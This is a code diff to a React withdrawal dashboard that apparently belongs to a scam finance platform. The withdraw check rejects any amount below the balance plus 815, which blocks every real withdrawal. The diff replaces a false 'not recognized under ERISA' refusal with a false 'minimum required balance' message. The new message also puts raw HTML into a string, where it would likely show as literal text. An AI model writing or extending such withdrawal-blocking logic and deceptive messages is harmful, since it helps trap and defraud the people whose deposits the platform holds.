@@ -674,10 +674,12 @@ export default function Dashboard() {
             {Number(withdrawAmount) < 0 ? (
               <p className="mb-6 text-sm">
                 <span className="text-red-400">
-                  Ineligible Recipient: not recognized under ERISA. Fix the
-                  issue and try again.
+                  You have not reached the minimum required balance to make a
+                  withdrawal.
                 </span>{" "}
-                <span className="text-white">Current balance: ${balance}</span>
+                <span className="text-blue-400">
+                  Current balance: ${balance}
+                </span>
               </p>
             ) : (
               <>
@@ -841,15 +843,8 @@ export default function Dashboard() {
                   onClick={async () => {
                     if (Number(withdrawAmount) < balance + 815) {
                       setWithdrawMessage(
-                        <p className="mb-6 text-sm">
-                          <span className="text-red-700">
-                            Ineligible Recipient: not recognized under ERISA.
-                            Fix the issue and try again.
-                          </span>{" "}
-                          <span className="text-indigo-600">
-                            Current balance: ${balance}
-                          </span>
-                        </p>,
+                        `You have not reached the minimum required balance to make a withdrawal. 
+                          <span class="text-blue-400">Current balance: $${balance}</span>`,
                       );
                       // setWithdrawMessage(
                       //   "You cannot make repeated withdrawals.",
